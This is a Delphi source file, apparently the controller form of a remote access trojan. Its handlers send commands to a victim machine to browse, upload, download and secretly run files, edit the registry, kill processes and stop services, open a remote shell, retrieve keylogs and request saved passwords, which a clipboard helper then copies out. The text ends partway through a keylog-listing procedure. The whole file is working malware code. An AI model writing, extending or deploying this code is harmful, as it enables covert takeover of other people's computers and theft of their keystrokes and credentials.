unit uControl;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Buttons, ImgList, Menus, uCommands, uRegAdd,
  uVNC, uWebCam, winsock, ToolWin, ShellAPi, bsSkinData, BusinessSkinForm;

type
  TForm10 = class(TForm)
    tvCommand: TTreeView;
    pgc1: TPageControl;
    ts1: TTabSheet;
    ts2: TTabSheet;
    ts3: TTabSheet;
    pgc2: TPageControl;
    ts4: TTabSheet;
    edtPath: TEdit;
    lvFiles: TListView;
    ts5: TTabSheet;
    lvTransfer: TListView;
    il1: TImageList;
    stat1: TStatusBar;
    pm1: TPopupMenu;
    MenuItem1: TMenuItem;
    MenuItem2: TMenuItem;
    MenuItem3: TMenuItem;
    MenuItem4: TMenuItem;
    MenuItem5: TMenuItem;
    MenuItem6: TMenuItem;
    MenuItem7: TMenuItem;
    MenuItem8: TMenuItem;
    MenuItem9: TMenuItem;
    MenuItem10: TMenuItem;
    lvProcess: TListView;
    cbbReg: TComboBox;
    btnRRefresh: TBitBtn;
    lvKeys: TListView;
    lvValues: TListView;
    il2: TImageList;
    edtRegPath: TEdit;
    pmRegValue: TPopupMenu;
    RegRefresh: TMenuItem;
    N1: TMenuItem;
    NewItem1: TMenuItem;
    DeleteItem1: TMenuItem;
    pmRegKey: TPopupMenu;
    New1: TMenuItem;
    Rename1: TMenuItem;
    Delete1: TMenuItem;
    pmWindow: TPopupMenu;
    Refresh2: TMenuItem;
    N2: TMenuItem;
    MinimizeWindow1: TMenuItem;
    MaximizeWindow1: TMenuItem;
    N3: TMenuItem;
    CloseWindow1: TMenuItem;
    pmProcess: TPopupMenu;
    Refresh1: TMenuItem;
    MenuItem11: TMenuItem;
    erminate1: TMenuItem;
    pmService: TPopupMenu;
    Refresh3: TMenuItem;
    N4: TMenuItem;
    StartService1: TMenuItem;
    StopService1: TMenuItem;
    il3: TImageList;
    ts6: TTabSheet;
    lvWindow: TListView;
    ts7: TTabSheet;
    lvService: TListView;
    ts8: TTabSheet;
    tvKeylogs: TTreeView;
    il4: TImageList;
    btnGetKeylog: TBitBtn;
    redtKeylog: TRichEdit;
    ts9: TTabSheet;
    edtShell: TEdit;
    pmRemoteShell: TPopupMenu;
    Activate1: TMenuItem;
    Close1: TMenuItem;
    redtShell: TRichEdit;
    dlgOpen1: TOpenDialog;
    il5: TImageList;
    pm2: TPopupMenu;
    StopTransfer1: TMenuItem;
    DownloadCompressed1: TMenuItem;
    DownloadUncompressed1: TMenuItem;
    tlb1: TToolBar;
    cbb1: TComboBoxEx;
    btnFRefresh: TBitBtn;
    btn1: TToolButton;
    btn2: TBitBtn;
    btn3: TBitBtn;
    btn4: TBitBtn;
    btn5: TToolButton;
    btn6: TBitBtn;
    ExecuteDirectory1: TMenuItem;
    DeleteDirectory1: TMenuItem;
    RenameDirectory1: TMenuItem;
    CreateNewDirectory1: TMenuItem;
    bsbsnsknfrm1: TbsBusinessSkinForm;
    bskndt1: TbsSkinData;
    bscmprsdstrdskn1: TbsCompressedStoredSkin;
    tsPwd: TTabSheet;
    lvPasswd: TListView;
    pmPasswd: TPopupMenu;
    G1: TMenuItem;
    N5: TMenuItem;
    ilPwd: TImageList;
    C1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure AddTransfer(sRemotePath,sPath,sFile:string; bDownload:Boolean);
    procedure btnFRefreshClick(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure cbb1Select(Sender: TObject);
    procedure RenameFile1Click(Sender: TObject);
    procedure MenuItem6Click(Sender: TObject);
    procedure MenuItem4Click(Sender: TObject);
    procedure MenuItem7Click(Sender: TObject);
    procedure MenuItem5Click(Sender: TObject);
    procedure MenuItem1Click(Sender: TObject);
    procedure lvFilesDblClick(Sender: TObject);
    procedure btnRRefreshClick(Sender: TObject);
    procedure New1Click(Sender: TObject);
    procedure Rename1Click(Sender: TObject);
    procedure Delete1Click(Sender: TObject);
    procedure RegRefreshClick(Sender: TObject);
    procedure NewItem1Click(Sender: TObject);
    procedure lvKeysDblClick(Sender: TObject);
    procedure cbbRegSelect(Sender: TObject);
    procedure Refresh1Click(Sender: TObject);
    procedure erminate1Click(Sender: TObject);
    procedure Refresh2Click(Sender: TObject);
    procedure MinimizeWindow1Click(Sender: TObject);
    procedure MaximizeWindow1Click(Sender: TObject);
    procedure CloseWindow1Click(Sender: TObject);
    procedure Refresh3Click(Sender: TObject);
    procedure StartService1Click(Sender: TObject);
    procedure StopService1Click(Sender: TObject);
    procedure pmServicePopup(Sender: TObject);
    procedure btnGetKeylogClick(Sender: TObject);
    procedure tvKeylogsDblClick(Sender: TObject);
    procedure ListKeylogs;
    function TracePath(Node : TTreeNode; DirName : string):string;
    procedure LoadKeylog(sFilename:String);
    procedure FileSearchEx(PathName: string; Node : TTreeNode);
    procedure Activate1Click(Sender: TObject);
    procedure Close1Click(Sender: TObject);
    procedure edtShellKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure tvCommandDblClick(Sender: TObject);
    procedure MenuItem10Click(Sender: TObject);
    procedure StopTransfer1Click(Sender: TObject);
    procedure DeleteItem1Click(Sender: TObject);
    procedure DownloadUncompressed1Click(Sender: TObject);
    procedure DownloadCompressed1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure btn6Click(Sender: TObject);
    procedure pm1Popup(Sender: TObject);
    procedure CreateNewDirectory1Click(Sender: TObject);
    procedure DeleteDirectory1Click(Sender: TObject);
    procedure ExecuteDirectory1Click(Sender: TObject);
    procedure RenameDirectory1Click(Sender: TObject);
    procedure G1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
  private
    { Private declarations }
  public
    mClThread:TThread;
    sUsername, sUserFolder:String;
    cntDownloads:Integer;
    mVNC:TForm4;
    mCam:TForm9;
    mInList:Boolean;
    { Public declarations }
  end;

var
  Form10: TForm10;

implementation

uses uMain, uFunctions, uClients, Clipbrd;

{$R *.dfm}
function GetLastPath(strPath:String):String;
begin
  Result := '';
  Delete(strPath,Length(strPath),1);
  strPath := ExtractFilePath(strPath);
  Result := StrPath;
end;

procedure TForm10.AddTransfer(sRemotePath,sPath,sFile:string; bDownload:Boolean);
var
  lstTemp:TListItem;
  tTrans: TSocketInfo;
begin
  cntDownloads := cntDownloads + 1;
  lstTemp := lvTransfer.Items.Add;
  lstTemp.caption := sFile;
  lstTemp.SubItems.Add('0 KByte/s)');
  lstTemp.SubItems.Add('0 %');
  lstTemp.SubItems.Add('-');
  lstTemp.SubItems.Add('Waiting for socket...');

  tTrans := TSocketInfo.Create;
  tTrans.lvItem := lstTemp;
  tTrans.sLocalPath := sPath + sFile;
  tTrans.sRemotePath := sRemotePath + sFile;
  tTrans.lTransferID := cntDownloads;
  tTrans.lSocketID := TClientThread(mClThread).mySocket;
  tTrans.fControl := Self;
  lstTemp.SubItems.Objects[0] := tTrans;

  if bDownload then
    lstTemp.ImageIndex := 18
  else
    lstTemp.ImageIndex := 17;

end;

procedure TForm10.btn2Click(Sender: TObject);
begin
  MenuItem1Click(nil);
end;

procedure TForm10.btn3Click(Sender: TObject);
begin
  TClientThread(mClThread).SendData(PACK_SHORTCUT,'0');
end;

procedure TForm10.btn4Click(Sender: TObject);
begin
  TClientThread(mClThread).SendData(PACK_SHORTCUT,'1');
end;

procedure TForm10.btn6Click(Sender: TObject);
begin
  ShellExecute(0, nil, PChar(sUserFolder + '\Downloads\'), nil, nil, SW_SHOW);
end;

procedure TForm10.btnFRefreshClick(Sender: TObject);
begin
  if Length(edtPath.text) > 3 then begin
    edtPath.text := ExtractFilePath(Copy(edtPath.text, 1, Length(edtPath.text)-1));
  end;
  if edtPath.text <> '' then begin
    lvFiles.Clear;
    If TClientThread(mClThread).SendData(PACK_GETDIRS,edtPath.Text) then begin
      Stat1.Panels.Items[0].Text := 'Requesting directories...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant request directories!';
    end;
  end;
end;

procedure TForm10.Activate1Click(Sender: TObject);
begin
  redtShell.Clear;
  If TClientThread(mClThread).SendData(PACK_SHELLSTART,'') then begin
    Stat1.Panels.Items[0].Text := 'Starting Shell...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Error! Cant start Shell!';
  end;
end;

procedure TForm10.btnGetKeylogClick(Sender: TObject);
var
  sTempStr:String;
begin
  sTempStr := IntToStr(TClientThread(mClThread).mySocket);
  If TClientThread(mClThread).SendData(PACK_KEYLOGREQUEST,sTempStr) then begin
    Stat1.Panels.Items[0].Text := 'Requesting keylog...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Error! Cant request keylog!';
  end;
end;

procedure TForm10.btnRRefreshClick(Sender: TObject);
begin
  if (edtRegPath.Text = 'HKEY_CLASSES_ROOT\') or (edtRegPath.Text = 'HKEY_CURRENT_USER\') or (edtRegPath.Text = 'HKEY_LOCAL_MACHINE\') or (edtRegPath.Text = 'HKEY_USERS\') or (edtRegPath.Text = 'HKEY_CURRENT_CONFIG\') then exit;
  edtRegPath.Text := GetLastPath(edtRegPath.Text);
  lvKeys.Clear;
  lvValues.Clear;
  if edtRegPath.Text <> '' then begin
    If TClientThread(mClThread).SendData(PACK_ENUMKEYS,edtRegPath.Text) then begin
      Stat1.Panels.Items[0].Text := 'Requesting keys...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant request keys!';
    end;
  end;
end;

procedure TForm10.C1Click(Sender: TObject);
var
 pwTempStr: string;
begin
//
 pwTempStr:='URL      :'+lvPasswd.Selected.SubItems[0]+#13#10+
            'Username :'+lvPasswd.Selected.SubItems[1]+#13#10+
            'Password :'+lvPasswd.Selected.SubItems[1]+#13#10;
 Clipboard.AsText:=pwTempStr;
 pwTempStr:='';
end;

procedure TForm10.cbb1Select(Sender: TObject);
var
  sPath:String;
begin
  sPath := cbb1.ItemsEx.Items[cbb1.ItemIndex].Caption;
  if sPath <> '' then begin
    lvFiles.Clear;
    edtPath.Text := sPath;
    If TClientThread(mClThread).SendData(PACK_GETDIRS,edtPath.Text) then begin
      Stat1.Panels.Items[0].Text := 'Requesting directories...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant request directories!';
    end;
  end;
end;

procedure TForm10.cbbRegSelect(Sender: TObject);
var
  sPath:String;
begin
  sPath := cbbReg.Text + '\';
  if sPath <> '' then begin
    lvValues.Clear;
    lvKeys.Clear;
    edtRegPath.Text := sPath;
    If TClientThread(mClThread).SendData(PACK_ENUMKEYS,edtRegPath.Text) then begin
      Stat1.Panels.Items[0].Text := 'Requesting keys...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant request keys!';
    end;
  end;
end;

procedure TForm10.Close1Click(Sender: TObject);
begin
  If TClientThread(mClThread).SendData(PACK_SHELLDATA,'exit') then begin
    Stat1.Panels.Items[0].Text := 'Stopping Shell...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Error! Cant stop Shell!';
  end;
end;

procedure TForm10.CloseWindow1Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvWindow.Selected = nil then exit;
  sTempStr := lvWindow.Selected.SubItems[1];
  If TClientThread(mClThread).SendData(PACK_WINDOWCLOSE,sTempStr) then begin
    Stat1.Panels.Items[0].Text := 'Closing window...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Socket Error!';
  end;
end;

procedure TForm10.CreateNewDirectory1Click(Sender: TObject);
var
  sTemp:String;
begin
  sTemp := InputBox('Create Directory','Type in the directory name','');
  if sTemp <> '' then begin
    sTemp := edtPath.Text + sTemp;
    If TClientThread(mClThread).SendData(PACK_DIRCREATE,sTemp) then begin
      Stat1.Panels.Items[0].Text := 'Creating new directory...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant create a new directory!';
    end;
  end;
end;

procedure TForm10.Delete1Click(Sender: TObject);
begin
  if lvKeys.Selected = nil then exit;
  if edtRegPath.Text <> '' then begin
    If TClientThread(mClThread).SendData(PACK_REGDELETE,edtRegPath.Text + lvKeys.Selected.Caption + '\') then begin
      Stat1.Panels.Items[0].Text := 'Deleting keys...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant delete keys!';
    end;
  end;
end;

procedure TForm10.DeleteDirectory1Click(Sender: TObject);
begin
  if lvFiles.Selected = nil then exit;
  if edtPath.Text <> '' then begin
    If TClientThread(mClThread).SendData(PACK_DIRDELETE,edtPath.Text + lvFiles.Selected.Caption) then begin
      Stat1.Panels.Items[0].Text := 'Deleting directory...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant delete diretory!';
    end;
  end;
end;

procedure TForm10.DeleteItem1Click(Sender: TObject);
begin
  if lvValues.Selected = nil then exit;
  if edtRegPath.Text <> '' then begin
    If TClientThread(mClThread).SendData(PACK_REGDELETE,edtRegPath.Text + lvValues.Selected.Caption) then begin
      Stat1.Panels.Items[0].Text := 'Deleting value...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant delete value!';
    end;
  end;
end;

procedure TForm10.DownloadCompressed1Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvFiles.Selected = nil then exit;
  if (lvFiles.Selected.SubItems.Strings[0] <> 'Directory') and (lvFiles.Selected.SubItems.Strings[1] <> '-') then begin
    AddTransfer(edtPath.Text, GetUserFolder(sUsername + '\Downloads' ), lvFiles.Selected.Caption, True);
    sTempStr := '|' + edtPath.text + lvFiles.Selected.Caption + '|' + IntToStr(TClientThread(mClThread).mySocket) + '|' + IntToStr(cntDownloads);
    If TClientThread(mClThread).SendData(PACK_COMPRESSEDTRANSFERFILE,sTempStr) then begin
      Stat1.Panels.Items[0].Text := 'Requesting file...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant request file!';
    end;
  end;
end;

procedure TForm10.DownloadUncompressed1Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvFiles.Selected = nil then exit;
  if (lvFiles.Selected.SubItems.Strings[0] <> 'Directory') and (lvFiles.Selected.SubItems.Strings[1] <> '-') then begin
    AddTransfer(edtPath.Text, GetUserFolder(sUsername + '\Downloads' ), lvFiles.Selected.Caption, True);
    sTempStr := '|' + edtPath.text + lvFiles.Selected.Caption + '|' + IntToStr(TClientThread(mClThread).mySocket) + '|' + IntToStr(cntDownloads);
    If TClientThread(mClThread).SendData(PACK_TRANSFERFILE,sTempStr) then begin
      Stat1.Panels.Items[0].Text := 'Requesting file...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant request file!';
    end;
  end;
end;

procedure TForm10.edtShellKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if key = 13 then begin
    If TClientThread(mClThread).SendData(PACK_SHELLDATA,edtShell.Text) then begin
      Stat1.Panels.Items[0].Text := 'Sending Command...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant send Command!';
    end;
    edtShell.Clear;
  end;
end;

procedure TForm10.erminate1Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvProcess.Selected = nil then exit;
  sTempStr := lvProcess.Selected.SubItems[1];
  If TClientThread(mClThread).SendData(PACK_TERMINATEPROCESS,sTempStr) then begin
    Stat1.Panels.Items[0].Text := 'Terminating Process...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Socket Error!';
  end;
end;

procedure TForm10.ExecuteDirectory1Click(Sender: TObject);
begin
if lvFiles.Selected = nil then exit;
  if edtPath.Text <> '' then begin
    If TClientThread(mClThread).SendData(PACK_EXECUTEFILEVISIBLE,edtPath.Text + lvFiles.Selected.Caption + '\') then begin
      Stat1.Panels.Items[0].Text := 'Executing directory...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant execute diretory!';
    end;
  end;
end;

procedure TForm10.FormCreate(Sender: TObject);
begin
  tvCommand.Items.Item[0].Expand(True);
  tvCommand.Items.Item[6].Expand(True);
  tvCommand.Items.Item[12].Expand(True);
end;

procedure TForm10.FormShow(Sender: TObject);
var
  mListItem:TList;
  mSocketInfo:TSocketInfo;
begin
  sUserFolder := GetUserFolder(sUsername);
  GetUserFolder(sUsername + '\Downloads');
  GetUserFolder(sUsername + '\Keylogs');
  GetUserFolder(sUsername + '\Camshots');
  GetUserFolder(sUsername + '\Screenshots');
  ListKeylogs;
  cbb1.Clear;
  lvFiles.Clear;
  if mInList = False then begin
    mSocketInfo := TSocketInfo.Create;
    mSocketInfo.lSocketID := TClientThread(mClThread).mySocket;
    mSocketInfo.fControl := Self;
    try
      mListItem := Form1.CenterList.LockList;
      mListItem.Add(mSocketInfo);
    finally
      Form1.CenterList.UnlockList;
    end;
  end;
  If TClientThread(mClThread).SendData(PACK_GETDRIVES,'') then begin
    Stat1.Panels.Items[0].Text := 'Requesting drives...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Error! Cant request drives!';
  end;
end;

procedure TForm10.G1Click(Sender: TObject);
begin
 lvPasswd.Items.Clear;
 if TClientThread(mClThread).SendData(PACK_GETPASSWD,'')
  then stat1.Panels.Items[0].Text:='Requesting passwords...'
  else stat1.Panels.Items[0].Text:='Error! Cant request passwords!';
end;

procedure TForm10.lvFilesDblClick(Sender: TObject);
begin
  if lvFiles.Selected = nil then exit;
  if (lvFiles.Selected.SubItems.Strings[0] = 'Directory') and (lvFiles.Selected.SubItems.Strings[1] = '-') then begin
    edtPath.Text := edtPath.Text + lvFiles.Selected.Caption + '\';
    lvFiles.Clear;
    If TClientThread(mClThread).SendData(PACK_GETDIRS,edtPath.Text) then begin
      Stat1.Panels.Items[0].Text := 'Requesting directories...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant request directories!';
    end;
  end;
end;

procedure TForm10.lvKeysDblClick(Sender: TObject);
begin
  if lvKeys.Selected = nil then exit;
  edtRegPath.Text := edtRegPath.Text + lvKeys.Selected.Caption + '\';
  lvKeys.Clear;
  lvValues.Clear;
  if edtRegPath.Text <> '' then begin
    If TClientThread(mClThread).SendData(PACK_ENUMKEYS,edtRegPath.Text) then begin
      Stat1.Panels.Items[0].Text := 'Requesting keys...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant request keys!';
    end;
  end;
end;

procedure TForm10.MaximizeWindow1Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvWindow.Selected = nil then exit;
  sTempStr := lvWindow.Selected.SubItems[1];
  If TClientThread(mClThread).SendData(PACK_WINDOWMAX,sTempStr) then begin
    Stat1.Panels.Items[0].Text := 'Maximizing window...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Socket Error!';
  end;
end;

procedure TForm10.MenuItem10Click(Sender: TObject);
var
  sTempStr:String;
begin
  if (dlgOpen1.Execute = false) or (dlgOpen1.FileName = '') or (edtPath.Text = '') or (FileExists(dlgOpen1.FileName) = False) then
    Exit;
  AddTransfer(edtPath.Text + ExtractFileName(dlgOpen1.Filename), dlgOpen1.Filename, '', False);
  sTempStr := '|' + IntToStr(TClientThread(mClThread).mySocket) + '|' + IntToStr(cntDownloads);
  If TClientThread(mClThread).SendData(PACK_UPLOADFILE,sTempStr) then begin
    Stat1.Panels.Items[0].Text := 'Sending file...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Error! Cant send file!';
  end;
end;

procedure TForm10.MenuItem1Click(Sender: TObject);
begin
  lvFiles.Clear;
  If TClientThread(mClThread).SendData(PACK_GETDIRS,edtPath.Text) then begin
    Stat1.Panels.Items[0].Text := 'Requesting directories...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Error! Cant request directories!';
  end;
end;

procedure TForm10.MenuItem4Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvFiles.Selected = nil then exit;
  if (lvFiles.Selected.SubItems.Strings[0] <> 'Directory') and (lvFiles.Selected.SubItems.Strings[1] <> '-') then begin
    sTempStr := edtPath.Text + lvFiles.Selected.Caption;
    If TClientThread(mClThread).SendData(PACK_EXECUTEFILEVISIBLE,sTempStr) then begin
      Stat1.Panels.Items[0].Text := 'Executing File...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Socket Error!';
    end;
  end;
end;

procedure TForm10.MenuItem5Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvFiles.Selected = nil then exit;
  if (lvFiles.Selected.SubItems.Strings[0] <> 'Directory') and (lvFiles.Selected.SubItems.Strings[1] <> '-') then begin
    sTempStr := edtPath.Text + lvFiles.Selected.Caption;
    If TClientThread(mClThread).SendData(PACK_EXECUTEFILEHIDDEN,sTempStr) then begin
      Stat1.Panels.Items[0].Text := 'Executing File...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Socket Error!';
    end;
  end;
end;

procedure TForm10.MenuItem6Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvFiles.Selected = nil then exit;
  if (lvFiles.Selected.SubItems.Strings[0] <> 'Directory') and (lvFiles.Selected.SubItems.Strings[1] <> '-') then begin
    sTempStr := edtPath.Text + lvFiles.Selected.Caption;
    If TClientThread(mClThread).SendData(PACK_DELETEFILE,sTempStr) then begin
      Stat1.Panels.Items[0].Text := 'Deleting File...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Socket Error!';
    end;
  end;
end;

procedure TForm10.MenuItem7Click(Sender: TObject);
var
  sTemp:String;
begin
  if lvFiles.Selected = nil then exit;
  sTemp := InputBox('Rename File','Type in the new name','');
  if sTemp <> '' then begin
    sTemp := '|' + edtPath.Text + '|' +  lvFiles.Selected.Caption + '|' + sTemp;
    If TClientThread(mClThread).SendData(PACK_MOVEFILE,sTemp) then begin
      Stat1.Panels.Items[0].Text := 'Requesting directories...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant request directories!';
    end;
  end;
end;

procedure TForm10.MinimizeWindow1Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvWindow.Selected = nil then exit;
  sTempStr := lvWindow.Selected.SubItems[1];
  If TClientThread(mClThread).SendData(PACK_WINDOWMIN,sTempStr) then begin
    Stat1.Panels.Items[0].Text := 'Minimizing window...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Socket Error!';
  end;
end;

procedure TForm10.New1Click(Sender: TObject);
var
  strVal:String;
begin
  if edtRegPath.Text <> '' then begin
    strVal := InputBox('New Registrykey','Registry Key','Default');
    if strVal <> '' then begin
      If TClientThread(mClThread).SendData(PACK_REGADD,'|' + edtRegPath.Text + strVal + '|Key|') then begin
        Stat1.Panels.Items[0].Text := 'Adding new key...';
      end else begin
        Stat1.Panels.Items[0].Text := 'Error! Cant add new key!';
      end;
    end;
  end;
end;

procedure TForm10.NewItem1Click(Sender: TObject);
var
  tempForm:TForm8;
begin
  if edtRegPath.Text <> '' then begin
    tempForm := TForm8.Create(nil);
    tempForm.sSocket := TClientThread(mClThread).mySocket;
    tempForm.sPath := edtRegPath.Text;
    tempForm.Show;
  end;
end;

procedure TForm10.pm1Popup(Sender: TObject);
var
  i:Integer;
begin
  //First make all items visible
  for i := 0 to pm1.Items.Count -1 do begin
    pm1.Items.Items[i].Visible := True;
  end;
  //If no item is selected hide all items except refresh and upload
  if lvFiles.Selected = nil then begin
    for i := 2 to 10 do begin
      if i <> 5 then
        pm1.Items.Items[i].Visible := False;
    end;
    exit;
  end;
  //If item is directory
  if ((lvFiles.Selected.SubItems[0] = 'Directory') and (lvFiles.Selected.ImageIndex = 7 )) then begin
    for i := 2 to 4 do begin
      pm1.Items.Items[i].Visible := False;
    end;
    exit;
  end;
  //if item is file
  for i := 6 to 9 do begin
      pm1.Items.Items[i].Visible := False;
  end;
  exit;

end;

procedure TForm10.pmServicePopup(Sender: TObject);
begin
  pmService.Items[2].Enabled := True;
  pmService.Items[3].Enabled := True;
  if lvService.Selected = nil then begin
    pmService.Items[2].Enabled := False;
    pmService.Items[3].Enabled := False;
    exit;
  end;
  if lvService.Selected.SubItems[1] = 'Running' then
    pmService.Items[2].Enabled := False;
  if lvService.Selected.SubItems[1] = 'Stopped' then
    pmService.Items[3].Enabled := False;
end;

procedure TForm10.Refresh1Click(Sender: TObject);
begin
  lvProcess.Clear;
  If TClientThread(mClThread).SendData(PACK_PROCESSES,'') then begin
    Stat1.Panels.Items[0].Text := 'Requesting processlist...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Error! Cant request processlist!';
  end;
end;

procedure TForm10.Refresh2Click(Sender: TObject);
begin
  lvWindow.Clear;
  If TClientThread(mClThread).SendData(PACK_ENUMWINDOW,'') then begin
    Stat1.Panels.Items[0].Text := 'Requesting windowlist...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Error! Cant request windowlist!';
  end;
end;

procedure TForm10.Refresh3Click(Sender: TObject);
begin
  lvService.Clear;
  If TClientThread(mClThread).SendData(PACK_ENUMSERVICE,'') then begin
    Stat1.Panels.Items[0].Text := 'Requesting servicelist...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Error! Cant request servicelist!';
  end;
end;

procedure TForm10.RegRefreshClick(Sender: TObject);
begin
  if edtRegPath.Text <> '' then begin
    lvKeys.Clear;
    lvValues.Clear;
    if edtRegPath.Text <> '' then begin
      If TClientThread(mClThread).SendData(PACK_ENUMKEYS,edtRegPath.Text) then begin
        Stat1.Panels.Items[0].Text := 'Requesting keys...';
      end else begin
        Stat1.Panels.Items[0].Text := 'Error! Cant request keys!';
      end;
    end;
  end;
end;

procedure TForm10.Rename1Click(Sender: TObject);
var
  strVal:String;
begin
  if lvKeys.Selected = nil then exit;
  if edtRegPath.Text <> '' then begin
    strVal := InputBox('Rename Registrykey','Registry Key','Default');
    if strVal <> '' then begin
      If TClientThread(mClThread).SendData(PACK_REGRENAME,'|' + edtRegPath.Text + lvKeys.Selected.Caption + '|' + edtRegPath.Text + strVal) then begin
        Stat1.Panels.Items[0].Text := 'Renaming key...';
      end else begin
        Stat1.Panels.Items[0].Text := 'Error! Cant rename key!';
      end;
    end;
  end;
end;

procedure TForm10.RenameDirectory1Click(Sender: TObject);
var
  sTemp:String;
begin
  if lvFiles.Selected = nil then exit;
  sTemp := InputBox('Rename Directory','Type in the new name','');
  if sTemp <> '' then begin
    sTemp := '|' + edtPath.Text + '|' +  lvFiles.Selected.Caption + '|' + sTemp;
    If TClientThread(mClThread).SendData(PACK_DIRRENAME,sTemp) then begin
      Stat1.Panels.Items[0].Text := 'Renaming directory...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant rename directory!';
    end;
  end;
end;

procedure TForm10.RenameFile1Click(Sender: TObject);
var
  sTemp:String;
begin
  if lvFiles.Selected = nil then exit;
  sTemp := InputBox('Rename File','Type in the new name','');
  if sTemp <> '' then begin
    sTemp := '|' + edtPath.Text + '|' +  lvFiles.Selected.Caption + '|' + sTemp;
    If TClientThread(mClThread).SendData(PACK_MOVEFILE,sTemp) then begin
      Stat1.Panels.Items[0].Text := 'Renaming file...';
    end else begin
      Stat1.Panels.Items[0].Text := 'Error! Cant rename file!';
    end;
  end;
end;

procedure TForm10.S1Click(Sender: TObject);
begin
 //lvPasswd.Items.
end;

procedure TForm10.StartService1Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvService.Selected = nil then exit;
  sTempStr := lvService.Selected.Caption;
  If TClientThread(mClThread).SendData(PACK_STARTSERVICE,sTempStr) then begin
    Stat1.Panels.Items[0].Text := 'Starting service...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Socket Error!';
  end;
end;

procedure TForm10.StopService1Click(Sender: TObject);
var
  sTempStr:String;
begin
  if lvService.Selected = nil then exit;
  sTempStr := lvService.Selected.Caption;
  If TClientThread(mClThread).SendData(PACK_STOPSERVICE,sTempStr) then begin
    Stat1.Panels.Items[0].Text := 'Stopping service...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Socket Error!';
  end;
end;

procedure TForm10.StopTransfer1Click(Sender: TObject);
begin
  if lvTransfer.Selected <> nil then begin
    TClientThread(lvTransfer.Selected.SubItems.Objects[0]).Suspend;
    closesocket(TClientThread(lvTransfer.Selected.SubItems.Objects[0]).mySocket);
    TClientThread(lvTransfer.Selected.SubItems.Objects[0]).Resume;
  end;
end;

function TForm10.TracePath(Node : TTreeNode; DirName : string):string;
var s : string;
begin
   Result := '';
   If Node.Text = 'Keylogs' then Result := Node.Text
   else begin
      repeat
         s := Node.Parent.Text;
         Dirname := s + '\' + DirName;
         Node := Node.Parent;
      until (Node.Parent.Text = 'Keylogs');
      Result := DirName;
   end;
end;


procedure TForm10.LoadKeylog(sFilename:String);
var
  mFile : TextFile;
  text   : string;
begin
  redtKeylog.Clear;
  try
    AssignFile(mFile, sFilename);
    Reset(mFile);
    while not Eof(mFile) do
    begin
      ReadLn(mFile, text);
      redtKeylog.Lines.Add(text);
    end;
    CloseFile(mFile);
  except
  end;
end;



procedure TForm10.FileSearchEx(PathName: string; Node : TTreeNode);
var
  Rec  : TSearchRec;
  Filename : string;
  TempNode : TTreeNode;
begin
  Filename := '*.*';
  if FindFirst(Pathname + '*.*', faAnyFile - faDirectory, Rec) = 0 then
    try
      repeat
        TempNode := tvKeylogs.Items.AddChild(Node, Rec.Name);
        TempNode.ImageIndex := 1;
        TempNode.SelectedIndex := 1;
      until FindNext(Rec) <> 0;
    finally
      FindClose(Rec);
    end;

  if FindFirst(Pathname + '*.*', faDirectory, Rec) = 0 then
    try
      repeat
        if ((Rec.Attr and faDirectory) <> 0)  and (Rec.Name<>'.') and (Rec.Name<>'..') then begin
          TempNode := tvKeylogs.Items.AddChild(Node, Rec.Name);
          TempNode.ImageIndex := 0;
          TempNode.SelectedIndex := 0;
          FileSearchEx(PathName + Rec.Name + '\', TempNode);
        end;
      until FindNext(Rec) <> 0;
    finally
      FindClose(Rec);
    end;
end;

procedure TForm10.ListKeylogs;
var
  rootNode:TTreeNode;
begin
  tvKeylogs.Items.Clear;
